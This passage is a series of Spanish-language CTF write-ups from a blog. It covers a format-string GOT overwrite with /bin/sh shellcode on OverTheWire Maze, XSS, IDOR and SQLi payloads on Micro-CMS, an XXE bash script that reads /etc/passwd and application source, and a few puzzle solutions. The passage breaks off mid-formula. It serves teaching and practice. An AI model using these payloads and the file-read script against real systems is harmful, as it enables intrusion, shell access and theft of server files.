0x80485c0 \u0026lt;strlen@plt\u0026gt; ... 0x080489f9 \u0026lt;+612\u0026gt;: call 0x8048670 \u0026lt;send@plt\u0026gt; 0x080489fe \u0026lt;+617\u0026gt;: add esp,0x10 0x08048a01 \u0026lt;+620\u0026gt;: push 0x0 0x08048a03 \u0026lt;+622\u0026gt;: call 0x8048550 \u0026lt;_exit@plt\u0026gt; 0x08048a08 \u0026lt;+627\u0026gt;: push DWORD PTR [ebp-0x14] 0x08048a0b \u0026lt;+630\u0026gt;: call 0x8048660 \u0026lt;close@plt\u0026gt; 0x08048a10 \u0026lt;+635\u0026gt;: add esp,0x4 0x08048a13 \u0026lt;+638\u0026gt;: jmp 0x80488b8 \u0026lt;main+291\u0026gt; End of assembler dump. gdb-peda$ break *0x080489a2 Breakpoint 1 at 0x80489a2: file maze8.c, line 82.  Como el servidor genera un proceso hijo cada vez que se recibe una conexión, tenemos que decirle a GDB que siga el proceso hijo:\ngdb-peda$ set follow-fork-mode child gdb-peda$ run 1338 Starting program: /maze/maze8 1338 ^C Program received signal SIGINT, Interrupt. ... Stopped reason: SIGINT 0xf7fd7c99 in __kernel_vsyscall () gdb-peda$ x 0x08049d18 0x8049d18: 0x08048556 gdb-peda$ continue Continuing.  Ahora podemos probar el format string explicado anteriormente:\nmaze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08%1$n' | nc 127.0.0.1 1338 Give the correct password to proceed:  Y el servidor se para en el breakpoint. Ahora podemos examinar la dirección 0x08049d18 (que es la entrada de _exit en la GOT):\ngdb-peda$ x 0x08049d18 0x8049d18: 0x00000004  Como esperábamos, hemos escrito un valor de 0x00000004 porque se han impreso 4 caracteres antes del formato %n.\nPara conseguir escribir una dirección de la pila, necesitamos introducir un valor más grande que 0xfffdd000 (el comienzo del espacio de la pila). Por tanto, tendríamos que imprimir una cantidad enorme de caracteres (lo cual es imposible de gestionar).\nLa solución a esto es utilizar formatos como %hn y %hhn, que sobrescriben 2 bytes y 1 bytes, respectivamente. De momento, vamos a usar solo %hn:\ngdb-peda$ run 1339 Starting program: /maze/maze8 1339  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08%1$hn' | nc 127.0.0.1 1339 Give the correct password to proceed:  gdb-peda$ x 0x08049d18 0x8049d18: 0x08040004  Genial, hemos sobrescrito los últimos 2 bytes en esta dirección con 0x0004.\nVamos a añadir una variable de entorno con shellcode, como en niveles anteriores, y reiniciar GDB:\nmaze8@maze:~$ export TEST=$(python3 -c 'import os; os.write(1, b\"\\x90\" * 200 + b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze8@maze:~$ gdb -q /maze/maze8 Reading symbols from /maze/maze8...done. (gdb) source /usr/local/peda/peda.py gdb-peda$ set follow-fork-mode child gdb-peda$ break *0x080489a2 Breakpoint 1 at 0x80489a2: file maze8.c, line 82.  Hemos puesto un montón de instrucciones nop (\u0026quot;\\x90\u0026quot;) para prevenir probemas cuando explotemos el binario sin GDB.\nAhora vemos la posición de la variable de entorno TEST en la pila:\ngdb-peda$ start ... gdb-peda$ find TEST Searching for 'TEST' in: None ranges Found 2 results, display max 2 items: libc : 0xf7f6fd88 (\"TEST\") [stack] : 0xffffdd6e (\"TEST=\", '\\220' \u0026lt;repeats 195 times\u0026gt;...)  Entonces, necesitamos escribir 0xffffdd6e en la entrada de _exit de la GOT (0x08049d18). De momento, vamos a poner 0xdd80 en los últimos 2 bytes (se ha añadido un pequeño offset a la dirección de la variable de entorno). Para ello, necesitamos escribir 0xdd80 = 56704 caracteres, que puede hacerse con otro formato (%c).\nNótese que ya hay 4 bytes escritos (la dirección), por lo que un formato como %56700c será suficiente:\ngdb-peda$ run 1340 Starting program: /maze/maze8 1340  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08%56700c%1$hn' | nc 127.0.0.1 1340 Give the correct password to proceed:  gdb-peda$ x 0x08049d18 0x8049d18: 0x0804dd80  Perfecto, ahora tenemos que cambiar los 2 primeros bytes. Para esto, tenemos que poner 0xffff en la dirección 0x08049d18 + 2 = 0x08049d1a. Sin embargo, ya hemos escrito 0xdd80 bytes, por lo que necesitamos 0xffff - 0xdd80 = 8831 caracteres adicionales.\nPara efectuar los dos procesos de escritura a la vez, podemos usar el hecho de que los 4 primeros bytes irán a la posición 1 de la pila y los 4 bytes siguientes irán a la posición 2. Por tanto, pondremos \u0026quot;\\x18\\x9d\\x04\\x08\\x1a\\x9d\\x04\\x08\u0026quot; al principio (8 bytes), y tendremos que cambiar %56700c por %56696c (aunque no es estrictamente necesario ya que tenemos un montón de instrucciones nop). Este será el payload final:\ngdb-peda$ run 1341 Starting program: /maze/maze8 1341  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08\\x1a\\x9d\\x04\\x08%56696c%1$hn%8831c%2$hn' | nc 127.0.0.1 1341 Give the correct password to proceed:  gdb-peda$ x 0x08049d18 0x8049d18: 0xffffdd80  Y vemos que la entrada de _exit en la GOT se ha modificado por el valor deseado. Si continuamos, GDB tratará de otorgarnos una shell:\ngdb-peda$ continue Continuing. process 1730 is executing new program: /bin/dash Warning: Cannot insert breakpoint 1. Cannot access memory at address 0x80489a2  Ahora lo podemos probar sin GDB:\nmaze8@maze:~$ /maze/maze8  maze8@maze:~$ echo -e '\\x18\\x9d\\x04\\x08\\x1a\\x9d\\x04\\x08%56696c%1$hn%8831c%2$hn' | nc 127.0.0.1 1337 Give the correct password to proceed is wrong ^_^  maze8@maze:~$ export TEST=$(python3 -c 'import os; os.write(1, b\"\\x90\" * 200 + b\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xd2\\xcd\\x80\")') maze8@maze:~$ /maze/maze8 $ whoami maze9 $ cat /etc/maze_pass/maze9 jopieyahng  Y listo. Tenemos acceso como maze9 y vemos un mensaje de \u0026ldquo;congratulations\u0026rdquo;:\nmaze9@maze:~$ ls CONGRATULATIONS  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/overthewire/maze/","section":"ctf","summary":"OverTheWire - Maze","time":40,"title":"Maze"},{"contents":"Tenemos una página web sencilla que nos permite editar y crear artículos en Markdown:\nVamos a pinchar en \u0026ldquo;Testing\u0026rdquo;:\nAhora, podemos intentar editar el artículo actual. Se nos muestra una caja de texto para escribir el código Markdown ahí:\nMarkdown es un lenguaje de marcado similar a HTML pero más sencillo. Además, Markdown soporta el uso de etiquetas HTML. Por tanto, podemos intentar a poner un payload de Cross-Site Scripting (XSS) como este:\n\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;  Parece que no funciona. De hecho, si mostramos el código fuente, se ve que nuestro payload ha sido reemplazado:\nPor tanto, este payload está bloqueado. Vamos a probar este otro:\n\u0026lt;img src=\"x\" onerror=\"alert(123)\"\u0026gt;  Y ahora sí funciona, ya que se muestra la alerta:\nSi inspeccionamos el código fuente de nuevo, obtenemos una flag:\nMirando a la URL, vemos que hay un número al final (/page/1). Vamos a probar a poner otros números: para /page/2 tenemos \u0026ldquo;Markdown test\u0026rdquo;, para /page/3 obtenemos 404 Not Found. Pero para /page/4 tenemos 403 Forbidden:\nSi probamos más números solamente obtendremos 404 Not Found.\nVamos a ver qué pasa en \u0026ldquo;Markdown test\u0026rdquo;:\nNo hay nada más que hacer con el artículo. Sin embargo, vemos que la URL ha cambiado; ahora es /page/edit/2. Vamos a ver si podemos visualizar /page/edit/4, que nos daba error 403 Forbidden:\nY tenemos la segunda flag, explotando una vulnerabilidad de Referencia Directa a Objetos Insegura (IDOR).\nVamos a continuar creando un nuevo post:\nDecidí ponerle New1 como título y Test1 como contenido. Después, creé otro post usando New2 y Test2. Ahora, la página principal tiene esta pinta:\nVamos a probar a añadir el payload XSS con \u0026lt;img\u0026gt; en el título de alguno de los posts. En esta página el HTML no se está interpretando:\nPero si volvemos a la página principal, obtenemos otra flag:\nY finalmente, podemos deducir que la aplicación está utilizando una base de datos para almacenar los artículos. Por tanto, para mostrarlos, el servidor está realizando una consulta a la base de datos para obtener los artículos. Y entonces, podemos probar con algún payload de inyección de código SQL.\nPor ejemplo, podemos añadir una comilla simple para romper la sintaxis de SQL:\nY obtenemos la cuarta y última flag.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/hacker101ctf/micro-cms-v1/","section":"ctf","summary":"Pentesting web básico. XSS, IDOR, SQLi","time":1,"title":"Micro-CMS v1"},{"contents":"Se nos proporciona un archivo MP3 llamado Milkshake.mp3. Podemos echar un vistazo a las cadenas de caracteres imprimibles o los metadatos:\n$ file Milkshake.mp3 Milkshake.mp3: Audio file with ID3 version 2.4.0, extended header, contains:MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo $ strings -20 Milkshake.mp3 The Neptunes Present-Clones-ADTRCK 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CCOMM 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CTPE1 Chad Hugo/Pharrell Williams !$\u0026),/257:=@CFHKMPSVY\\^adgiloqtwy|~ $ exiftool Milkshake.mp3 ExifTool Version Number : 12.42 File Name : Milkshake.mp3 Directory : . File Size : 1511 kB File Modification Date/Time : 2017:08:28 16:05:06+02:00 File Access Date/Time : File Inode Change Date/Time : File Permissions : -rw-rw-r-- File Type : MP3 File Type Extension : mp3 MIME Type : audio/mpeg MPEG Audio Version : 1 Audio Layer : 3 Sample Rate : 44100 Channel Mode : Joint Stereo MS Stereo : Off Intensity Stereo : Off Copyright Flag : False Original Media : True Emphasis : None VBR Frames : 1568 VBR Bytes : 1510503 VBR Scale : 100 Encoder : LAME3.99r Lame VBR Quality : 0 Lame Quality : 0 Lame Method : VBR (new/mtrh) Lame Low Pass Filter : 22.1 kHz Lame Bitrate : 32 kbps Lame Stereo Mode : Joint Stereo ID3 Size : 451 Warning : Invalid ID3 frame size Audio Bitrate : 295 kbps Duration : 0:00:41 (approx)  Pero nada interesante. Podemos abrir el archivo de audio en Audacity:\nSi cambiamos a la vista de espectrograma, veremos algo extraño:\nY si hacemos un poco de zoom, conseguiremos la flag:\nEsta técnica no rompe el archivo de audio porque la flag está en valores de frecuencia elevados, y los humanos no podemos distinguir frecuencias más altas de 20 kHz.\nDe todas formas, la flag es: HTB{str4wberry_milkshak3}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/milkshake/","section":"ctf","summary":"Inspección de espetrograma de audio MP3. Esteganografía","time":1,"title":"Milkshake"},{"contents":"Se nos proporciona un archivo flag.txt que contiene algunos caracteres Unicode. Este es el volcado hexadecimal del archivo:\n$ xxd flag.txt 00000000: 69e2 808e 63e2 80ae 74e2 808e 66e2 80ae i...c...t...f... 00000010: 7be2 808e e280 8e75 6e31 6330 e280 ae64 {......un1c0...d 00000020: 655f 6de2 80ae 3467 3163 5f6e 61e2 808e e_m...4g1c_na... 00000030: e280 ae68 e280 8e73 e280 ae64 e280 ae66 ...h...s...d...f 00000040: 6fe2 80ae e280 8e61 7369 e280 8e68 e280 o......asi...h.. 00000050: aee2 80ae 6466 e280 8e61 736f 68e2 80ae ....df...asoh... 00000060: e280 8e64 666f 69e2 808e 6173 6864 66e2 ...dfoi...ashdf. 00000070: 808e e280 aee2 808e 6ae2 808e e280 ae6b ........j......k 00000080: e280 8e61 e280 8ee2 80ae e280 8e64 e280 ...a.........d.. 00000090: 8e73 e280 aee2 80ae 6866 e280 aee2 808e .s......hf...... 000000a0: 6c6a e280 ae61 64e2 80ae e280 8ee2 80ae lj...ad......... 000000b0: 73e2 80ae 66e2 808e 6864 736b 6ce2 80ae s...f...hdskl... 000000c0: 61e2 808e e280 ae68 e280 8e66 6ce2 80ae a......h...fl... 000000d0: e280 aee2 808e 6be2 80ae 686a e280 8ee2 ......k...hj.... 000000e0: 808e e280 ae64 e280 8ee2 808e e280 aee2 .....d.......... 000000f0: 80ae e280 ae61 e280 8ee2 808e 6673 7d0a .....a......fs}.  Podemos usar un poco de shell scripting para coger la última columna y quitar los caracteres ., de manera que conseguimos la flag:\n$ xxd flag.txt | awk 'NF { print $NF }' | tr -d .\\\\n ictf{un1c0de_m4g1c_nahsdfoasihdfasohdfoiashdfjkadshfljadsfhdsklahflkhjdafs}  De todas formas, al usar una shell como Zsh, podemos simplemente usar cat para ver la flag:\n$ catn flag.txt ictf{un1c0de_m4g1c_nahsdfoasihdfasohdfoiashdfjkadshfljadsfhdsklahflkhjdafs}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/mixup/","section":"ctf","summary":"ImaginaryCTF 03/08/2022. 30 puntos. Caracteres Unicode","time":1,"title":"mixup"},{"contents":"Se nos proporciona un mensaje cifrado:\ncvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX}  Vemos que el mensaje tiene más o menos el formato de una flag de picoCTF (picoCTF{...}), ya que hay 4 letras minúsculas y 3 mayúsculas antes de {, y termina con }. Además, también hay varios _.\nParece claro que el algoritmo de cifrado utilizado es de sustitución (cifrado César). El algoritmo más común es ROT13. Utilizando CyberChef, podemos descifrar el mensaje utilizando ROT13 y ver la flag:\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/picoctf/cryptography/mod-26/","section":"ctf","summary":"picoCTF 2021. 10 puntos. Cifrado de sustitución. ROT13","time":0,"title":"Mod 26"},{"contents":"Tenemos una simple página web que solicita un código para desbloquear:\nPodemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:\nNo hay nada en el código fuente de la página. En este punto, podemos aplicar fuzzing para enumerar más rutas existentes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  Existe una ruta /admin:\nEl código fuente de esta página contiene información útil:\nSi vamos a /get-config, veremos un documento XML\n$ curl http://35.190.155.168/c33a5d03b6/get-config \u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;Front door\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;  Como es XML, podría existir una vulnerabilidad de Entidad Externa XML (XXE). Si existe /get-config, es probable que exista /set-config:\n$ curl http://35.190.155.168/c33a5d03b6/set-config \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The browser (or proxy) sent a request that this server could not understand.\u0026lt;/p\u0026gt;  Se obtiene un error 400 Bad Request, por lo que seguramente necesitamos añadir parámetros en la URL (por GET) o un cuerpo de petición (usando POST):\n$ curl 'http://35.190.155.168/c33a5d03b6/set-config?location=asdf' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The browser (or proxy) sent a request that this server could not understand.\u0026lt;/p\u0026gt; $ curl http://35.190.155.168/c33a5d03b6/set-config -d location=asdf \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;405 Method Not Allowed\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Method Not Allowed\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The method is not allowed for the requested URL.\u0026lt;/p\u0026gt;  No parece que sea una petición POST. Como el parámetro location no funciona, podemos aplicar fuzzing sobre el nombre del parámetro con ffuf y filtrar por el código de estado 400:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u 'http://35.190.155.168/c33a5d03b6/set-config?FUZZ=asdf' -mc all -fc 400 data [Status: 500, Size: 291, Words: 38, Lines: 5]  Si el parámetro se llama data obtenemos un error 500 Internal Server Error:\n$ curl 'http://35.190.155.168/c33a5d03b6/set-config?data=asdf' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;500 Internal Server Error\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Internal Server Error\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.\u0026lt;/p\u0026gt;  Vamos a probar a poner el documento XML de /get-config en el parámetro data, pero cambiando el valor de la etiqueta location por asdf:\n$ curl http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode 'data=\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;asdf\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\"admin\"\u0026gt;admin\u0026lt;/a\u0026gt;. If not click the link. $ curl http://35.190.155.168/c33a5d03b6/admin \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Model E1337 \u0026amp;mdash; Home\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Admin Panel\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Lock location: \u0026lt;input type=\"text\" name=\"location\" value=\"asdf\" disabled\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!-- We should be using get-config for this on the client side. --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl http://35.190.155.168/c33a5d03b6/admin -s | grep asdf \u0026lt;p\u0026gt;Lock location: \u0026lt;input type=\"text\" name=\"location\" value=\"asdf\" disabled\u0026gt;\u0026lt;/p\u0026gt;  El valor que aparece en /admin ha cambiado. Ahora podemos introducir otro documento XML para leer archivos del sistema utilizando una Entidad Externa XML como esta:\n\u0026lt;?xml version=\"1.0\"?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u0026gt; ]\u0026gt; \u0026lt;config\u0026gt; \u0026lt;location\u0026gt;\u0026amp;xxe;\u0026lt;/location\u0026gt; \u0026lt;/config\u0026gt;  $ curl http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode 'data=\u0026lt;?xml version=\"1.0\"?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u0026gt; ]\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;\u0026amp;xxe;\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;' \u0026lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\"admin\"\u0026gt;admin\u0026lt;/a\u0026gt;. If not click the link. $ curl http://35.190.155.168/c33a5d03b6/admin \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Model E1337 \u0026mdash; Home\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Admin Panel\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Lock location: \u0026lt;input type=\"text\" name=\"location\" value=\"root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/bin/sh man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin postgres:x:70:70::/var/lib/postgresql:/bin/sh cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin \" disabled\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!-- We should be using get-config for this on the client side. --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Y obtenemos el archivo /etc/passwd del servidor. En este punto, podemos crear un simple script en Bash para obtener el contenido de un archivo dada la ruta absoluta (si existe), para automatizar el proceso:\n#!/usr/bin/env bash url=$1 file=$2 xml=\"\u0026lt;?xml version=\\\"1.0\\\"?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \\\"file://$file\\\"\u0026gt; ]\u0026gt; \u0026lt;config\u0026gt; \u0026lt;location\u0026gt; BEGINTAG \u0026amp;xxe; ENDTAG \u0026lt;/location\u0026gt; \u0026lt;/config\u0026gt;\" curl $url/set-config -G --data-urlencode \"data=$xml\" \u0026amp;\u0026gt;/dev/null res=$(curl $url/admin -s) begin=$(( $(echo \"$res\" | grep -n BEGINTAG | awk -F : '{ print $1 }') + 1 )) end=$(( $(echo \"$res\" | grep -n ENDTAG | awk -F : '{ print $1 }') - 1 )) echo -n \"$res\" | sed -n \"${begin},${end}p\"  Ahora con este script en Bash podemos leer archivos del servidor especificando una ruta absoluta:\n$ bash xxe.sh http://35.190.155.168/c33a5d03b6 /etc/hosts 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.18.0.20 c33a5d03b6b4  Aunque sabemos que el servidor tiene nginx, no podemos mostrar archivos de configuración como /etc/nginx/nginx.conf o /etc/nginx/sites-enabled/default.\nSin embargo, podemos deducir que el servidor está ejecutando Flask (un framework web para Python), ya que los mensajes de respuesta HTTP están en letras mayúsculas:\n$ curl http://35.190.155.168/c33a5d03b6/doesnotexist -I HTTP/1.1 404 NOT FOUND Server: nginx/1.14.0 (Ubuntu) Date: Content-Type: text/html Content-Length: 233 Connection: keep-alive Cache-Control: public, max-age=0 Pragma: no-cache Expires: 0  Y por tanto, podemos deducir que el archivo principal del código fuente es app.py, main.py, index.py o server.py. Y para directorios, podemos probar con /app (bastante común en contenedores Docker). Finalmente, vemos que /app/main.py funciona. Este es el archivo:\n$ bash xxe.sh http://35.190.155.168/c33a5d03b6 /app/main.py  import json, os, time, xml.sax from flask import Flask, redirect, request from jinja2 import Template from cStringIO import StringIO from rng import * # ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$ flags = json.loads(os.getenv('FLAGS')) os.unsetenv('FLAGS') app = Flask(__name__) templateCache = {} def render(tpl, **kwargs): if tpl not in templateCache: templateCache[tpl] = Template(file('templates/%s.html' % tpl).read()) return templateCache[tpl].render(**kwargs) @app.after_request def add_header(r): r.headers[\"Cache-Control\"] = \"no-cache, no-store, must-revalidate\" r.headers[\"Pragma\"] = \"no-cache\" r.headers[\"Expires\"] = \"0\" r.headers['Cache-Control'] = 'public, max-age=0' return r @app.route('/') def index(): return render('home') @app.route('/unlock', methods=['POST']) def unlock(): code = int(request.form['code']) cur = next(26) time.sleep(5) if code == cur: return 'Unlocked successfully. Flag: ' + flags[1] else: return 'Code incorrect. Expected %08i' % cur @app.route('/admin') def admin(): return render('admin', location=location) location = 'Front door' @app.route('/get-config') def getConfig(): return '\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\"?\u0026gt;\u0026lt;config\u0026gt;\u0026lt;location\u0026gt;%s\u0026lt;/location\u0026gt;\u0026lt;/config\u0026gt;' % location class Handler(xml.sax.ContentHandler): def __init__(self): self.location = None def startElement(self, name, attrs): if name == 'location': self.location = '' def endElement(self, name): if name == 'location': global location location = self.location self.location = None def characters(self, content): if self.location is not None: self.location += content @app.route('/set-config') def setConfig(): data = request.args['data'] parser = xml.sax.make_parser() parser.setContentHandler(Handler()) parser.parse(StringIO(data)) return redirect('admin') app.run(host='0.0.0.0', port=80)  Este archivo contiene un comentario con la primera flag.\nAhora podemos analizar la función que gestiona el código numérico de la página principal:\n@app.route('/unlock', methods=['POST']) def unlock(): code = int(request.form['code']) cur = next(26) time.sleep(5) if code == cur: return 'Unlocked successfully. Flag: ' + flags[1] else: return 'Code incorrect. Expected %08i' % cur  La función llamada next no es la que viene con Python. De hecho, se está tomando de rng:\nfrom rng import *  Por tanto, tiene que existir un archivo llamado rng.py, que es este:\n$ bash xxe.sh http://35.190.155.168/c33a5d03b6 /app/rng.py  import random def setup(seed): global state state = 0 for i in range(16): cur = seed \u0026amp; 3 seed \u0026gt;\u0026gt;= 2 state = (state \u0026lt;\u0026lt; 4) | ((state \u0026amp; 3) ^ cur) state |= cur \u0026lt;\u0026lt; 2 def next(bits): global state ret = 0 for _ in range(bits): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 state = (state \u0026lt;\u0026lt; 1) ^ (state \u0026gt;\u0026gt; 61) state \u0026amp;= 0xFFFFFFFFFFFFFFFF state ^= 0xFFFFFFFFFFFFFFFF for j in range(0, 64, 4): cur = (state \u0026gt;\u0026gt; j) \u0026amp; 0xF cur = (cur \u0026gt;\u0026gt; 3) | ((cur \u0026gt;\u0026gt; 2) \u0026amp; 2) | ((cur \u0026lt;\u0026lt; 3) \u0026amp; 8) | ((cur \u0026lt;\u0026lt; 2) \u0026amp; 4) state ^= cur \u0026lt;\u0026lt; j return ret setup((random.randrange(0x10000) \u0026lt;\u0026lt; 16) | random.randrange(0x10000))  Este archivo se utiliza para generar códigos evolutivos (rolling codes). Debemos obtener el siguiente código dados uno o más códigos anteriores, o por lo menos extraer la semilla original para poder generar más códigos evolutivos.\nEl script utiliza tres variables principalmente:\n seed: Es la semilla inicial. Es completamente aleatoria y se calcula así:  seed = (random.randrange(0x10000) \u0026lt;\u0026lt; 16) | random.randrange(0x10000)   ret: Es el siguiente código evolutivo. Se calcula utilizando una variable state. Básicamente, se toma el último bit de state y se pone al final de ret durante 26 iteraciones. Sin embargo, state cambia en cada iteración:  ret = 0 for _ in range(26): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 # Changes in state   state: Se genera inicialmente mediante la semilla seed como:  state = 0 for i in range(16): cur = seed \u0026amp; 3 seed \u0026gt;\u0026gt;= 2 state = (state \u0026lt;\u0026lt; 4) | ((state \u0026amp; 3) ^ cur) state |= cur \u0026lt;\u0026lt; 2  Pero esto no es útil porque seed es aleatoria. Vemos que state cambia en cada llamada a next, y de hecho, cambia en cada una de las 26 iteraciones de la llamada a next:\nfor _ in range(26): # Changes in ret state = (state \u0026lt;\u0026lt; 1) ^ (state \u0026gt;\u0026gt; 61) state \u0026amp;= 0xFFFFFFFFFFFFFFFF state ^= 0xFFFFFFFFFFFFFFFF for j in range(0, 64, 4): cur = (state \u0026gt;\u0026gt; j) \u0026amp; 0xF cur = (cur \u0026gt;\u0026gt; 3) | ((cur \u0026gt;\u0026gt; 2) \u0026amp; 2) | ((cur \u0026lt;\u0026lt; 3) \u0026amp; 8) | ((cur \u0026lt;\u0026lt; 2) \u0026amp; 4) state ^= cur \u0026lt;\u0026lt; j  Primero, tenemos esta operación (utilizando un número de 64 bits como una lista de bits):\n$$ \\mathrm{state} = [s_{63}, s_{62}, s_{61}, s_{60}, \\dots, s_2, s_1, s_0] $$\n$$ \\mathrm{state} = [s_{62}, s_{61}, s_{60}, \\dots, s_2, s_1, s_0, 0] \\hat{} [0, 0, 0, \\dots, 0, s_{63}, s_{62}, s_{61}] $$\n$$ \\mathrm{state} = [s_{62}, s_{61}, s_{60}, \\dots, s_2, (s_1 \\hat{} s_{63}), (s_0 \\hat{} s_{62}), s_{61}] $$\n$$ \\mathrm{state} = [\\overline{s_{62}}, \\overline{s_{61}}, 